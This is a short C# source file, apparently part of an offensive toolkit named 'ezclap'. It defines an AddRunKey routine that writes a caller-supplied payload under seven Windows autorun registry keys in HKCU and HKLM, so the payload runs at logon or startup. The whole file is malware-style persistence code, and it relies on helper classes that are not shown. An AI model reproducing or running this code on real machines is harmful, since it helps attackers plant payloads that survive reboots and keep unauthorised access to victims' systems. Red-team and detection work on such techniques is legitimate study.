using System;

namespace ezclap
{
	public class AddRunKey
	{
		public AddRunKey (string[] names, string payload)
		{

		}
		public static void Initialize(string[] names, string payload)
		{
            if (names.Length != 7)
            {
                Console.WriteLine("[-] AddRunKey requires 7 registry key names.");
                return;
            }
            /*
             *  Description: Add RunKey registry key with payload  
             */
            
            Utils.setHKCUSubKey(RegistryKeys.RunKey, names[0], payload);
            Utils.setHKCUSubKey(RegistryKeys.RunOnceKey, names[1], payload);

            Utils.setHKLMSubKey(RegistryKeys.RunKey, names[2], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunOnceKey, names[3], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunServices, names[4], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunServicesOnce, names[5], payload);
            Utils.setHKLMSubKey(RegistryKeys.RunOnceEx, names[6], payload);
            
        }
	}
}
